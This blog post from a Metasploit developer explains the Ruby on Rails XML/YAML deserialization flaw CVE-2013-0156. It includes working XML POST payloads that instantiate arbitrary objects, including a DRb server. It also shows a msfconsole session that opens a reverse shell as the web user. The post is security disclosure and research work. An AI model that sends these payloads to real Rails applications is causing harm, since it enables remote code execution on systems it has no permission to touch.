---
title: "Serialization Mischief in Ruby Land (CVE-2013-0156)"
url: http://r-7.co/VSbX6a
keywords: exploit,rails,sql,land,cve20130156,ruby,serialization,mischief,object,metasploit,using,application,symbol,code
---
This afternoon a [particularly scary advisory](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion) was posted to the Ruby on Rails (RoR) security discussion list. The summary is that the XML processor in RoR can be tricked into decoding the request as a YAML document or as a Ruby Symbol, both of which can expose the application to remote code execution or SQL injection. A gentleman by the name of Felix Wilhelm [went into detail](http://www.insinuator.net/2013/01/rails-yaml/) on how the vulnerability works, but stopped short of providing a working proof of concept. These kinds of bugs are close to my heart, as Metasploit itself is written in Ruby, and we use Ruby on Rails within the Metasploit Community, Express, and Pro user interfaces.

We marshaled the troops and released a [security update](https://community.rapid7.com/docs/DOC-2143) for Metasploit users (**2013010202**), updated all of our own RoR applications with the [workaround](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion), and started digging into the vulnerability itself.

Ben M. Murphy, a researcher working on this issue, [claims](http://www.reddit.com/r/netsec/comments/167c11/serious_vulnerability_in_ruby_on_rails_allowing/) that this can lead to direct system command execution in all Ruby on Rails web applications. If this pans out, this would put [thousands of production web sites](http://arstechnica.com/security/2013/01/extremely-crtical-ruby-on-rails-bug-threatens-more-than-200000-sites/) at risk of remote compromise.  Mr Murphy has not released his exploit code for the issue, but Felix\'s blog post provided enough information to start poking at the vulnerability.

To demonstrate the issue, send the following data as the body of a POST request to any RoR web application, with the Content-Type header set to \"application/xml\":

    <?xml version="1.0" encoding="UTF-8"?>
    <bang type="yaml">--- !ruby/object:Time {}
    </bang>

On the server side, this decodes to a live Time object:

    Parameters: {"bang"=>1969-12-31 18:00:00 -0600}

The mechanics of this bug allow for at least three different paths for exploitation:

1\. Trigger a SQL injection flaw by sending a Symbol in place of a parameter used in a Model.find\_by\*() call. This technique was discovered by [joernchen](https://twitter.com/joernchen) and [documented here](https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/DCNTNp_qjFM). This can be accomplished using both the YAML and Symbol types in the XML, but the Symbol format is easiest. **The original description was wrong, but SQL injection is still possible using Arel objects. Take a look at [Postmodern\'s blog post](https://github.com/ronin-ruby/ronin-ruby.github.com/blob/rails-pocs/blog/_posts/2013-01-09-rails-pocs.md) for more information on the SQL injection vector.**

2\. Allocate an arbitrary Ruby object and be able to set any instance variables. This object is sent instead of the expected parameter to the application. This can lead to all sorts of chaos, but doesn\'t provide remote code execution all by itself, since an object is required that does unsafe things with init\_with() or the application has to do something dangerous with the unexpected object parameter.

    <?xml version="1.0" encoding="UTF-8"?>
    <boom type="yaml"><![CDATA[--- !ruby/object:UnsafeObject
    attribute1: value1
    ]]></boom>

This results in a sequence that looks something like the following:

    obj = UnsafeObject.allocate
    if obj.respond_to?(:init_with)
      obj.init_with(.. attributes ..)
    else
      arguments.each_pair { |key,val| obj.instance_variable_set(key, val) }
    end

3\. Instantiate an arbitrary Ruby object and be able to call the \"\[\]=\" method with any desired parameters. This can be abused in a slightly different way and opens additional avenues for attack.

    <?xml version="1.0" encoding="UTF-8"?>
    <boom type="yaml"><![CDATA[--- !ruby/hash:UnsafeObject
    attribute1: value1
    ]]></boom>

This results in a different code path being taken:

    obj = UnsafeObject.new
    arguments.each_pair { |key,val| obj[key] = val }

In the case of \#1, the application must pass the Symbol parameter into a SQL query, which limits the attack surface to database-enabled applications. The interesting thing about methods \#2 and \#3 is that they will work regardless of whether the application does anything wtih SQL. The caveat is that the application needs to either do something unsafe with the unexpected object, or a class already in memory has to be abused through the init\_with() or \[\]= method handlers.

A quick review of common Ruby on Rails classes didn\'t turn up any obvious paths to exploit \#2 or \#3, but given Mr. Murphy\'s claims and the sheer number of code paths available, this is more than likely the worst security issue that the Rails platform has seen to date.

Stay tuned for more information on this flaw and more than likely a Metasploit module or two in the coming days.

-HD

**Update 1:** We are still looking into how this can be turned into a remote exploit, but for any application that has done a **require \"drb\"** somewhere in the dependency list, the following local exploit scenario works.\

First instantiate a DRb Server object in the Rails application using a request like the one below:\

    <?xml version="1.0" encoding="UTF-8"?>
    <boom type="yaml"><![CDATA[--- !ruby/hash:DRb::DRbServer {}
    ]]></boom>

Now open msfconsole and use the drb\_remote\_codeexec module to get a session as the web user. This is limited to the local system, since DRb picks a random port bound to localhost when instantiated with no arguments.

    $ msfconsole
    msf> use exploit/linux/misc/drb_remote_codeexec
    msf  exploit(drb_remote_codeexec) > set URI druby://localhost:45074
    msf  exploit(drb_remote_codeexec) > exploit
    [*] Started reverse double handler
    [*] trying to exploit instance_eval
    < snip >
    [*] Matching...
    [*] B is input...
    [*] Command shell session 1 opened (192.168.0.4:4444 -> 192.168.0.4:53299) at 2013-01-09 13:06:39 -0600
     
    id
    uid=1001(www) gid=1001(www) groups=1001(www)

**Update 2:** An anonymous contributor pointed us to a specific class that is exploitable using the ruby/hash method (\#3 above). The class is\
ActionDispatch::Routing::RouteSet::NamedRouteCollection. Expect a Metasploit module in the next 4-12 hours.

**Update 3:** The Metasploit module is [now available on GitHub](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_xml_yaml_code_exec.rb) and handles Ruby on Rails versions 2 and 3.

**Update 4:** [A walkthrough of using the scanner and exploit modules](/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156) is now available

**Update 5:** [CVE-2013-0333](/2013/01/29/exploit-for-ruby-on-rails-cve-2013-0333). Second verse, same as the first, except this time. Metapsloit itself is not vulnerable.\
